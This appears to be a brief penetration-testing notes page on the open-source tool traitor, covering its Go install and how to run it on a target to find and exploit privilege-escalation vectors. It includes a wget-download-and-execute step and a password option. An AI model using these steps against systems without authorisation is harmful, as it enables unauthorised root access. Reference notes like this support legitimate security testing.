# Privilege Escalation Using traitor

<div class="row row-cols-lg-2"><div>

[traitor](https://github.com/liamg/traitor) <small>(6.3k ⭐)</small> is an open-source tool to automatically detect common privilege escalation vectors and exploit them.

It's written in GO which you need to install to download the tool.

```shell!
$ sudo apt install golang-go
$ CGO_ENABLED=0 go install github.com/liamg/traitor/cmd/traitor@latest
```

The tool is available at `/home/kali/go/bin/traitor`. It can be uploaded and executed on any host without having them install GO.
</div><div>

To find vulnerable escalation vectors:

```shell!
$ wget [...] -O /tmp/traitor
$ /tmp/traitor
$ /tmp/traitor -p   # if the password is known
```
</div></div>